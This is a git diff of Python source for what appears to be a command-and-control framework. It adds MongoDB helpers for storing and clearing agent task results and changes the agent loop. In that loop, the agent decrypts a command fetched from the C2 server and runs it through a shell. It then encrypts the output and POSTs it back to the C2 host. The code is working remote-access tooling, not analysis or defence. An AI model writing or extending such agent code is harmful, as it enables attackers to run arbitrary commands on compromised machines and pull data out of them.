@@ -6,8 +6,9 @@ db = client.C2
 
 ''' 
 To-Do: 
-1- Handle bad requested tasks (bad commands)
-2- Delete the task after writing its result
+1- Handle bad requested tasks (bad commands) (Done)
+2- Delete the task after writing its result (Done) 
+3- Check how os.popen supports stderr return
 '''
 
 def registerAgent(agentID, type, bindListenerID, ip, port, timeout=86400):
@@ -72,6 +73,15 @@ def clearTask(agentID):
         }
     })
 
+def clearTaskResult(agentID):
+    db.agents.update_one({
+        'id': agentID
+    }, {
+        '$set': {
+            'taskResult': ''
+        }
+    })
+
 
 def assignTask(agentID, task):
 
@@ -92,6 +102,14 @@ def writeResult(agentID, result):
             'taskResult': result
         }
     })
+
+
+def readTaskResult(agentID): 
+    return db.agents.find_one({
+        'id': { 
+          '$eq': agentID  
+        }
+    }).get('taskResult')
 
 
 def getKey(id):
@@ -189,9 +207,12 @@ if __name__ == "__main__":
         if (task.text): 
             #decrypting data bfore executing command
             cmd = decrypt(task.text)
-            result = encrypt(os.popen('echo "{}" | sh'.format(cmd)).read())
-            if (result == ''): 
-                result = encrypt("Task completed but has no output")
+            result = os.popen('echo "{}" | sh'.format(cmd)).read()
+            
+            if (result): 
+                result = encrypt(result)
+            else: 
+                result = encrypt("Task didn't return a result") 
             
             r.post(url= _C2_ + '/task/results/{}'.format(_ID_), data = result.encode('ascii')) 
          
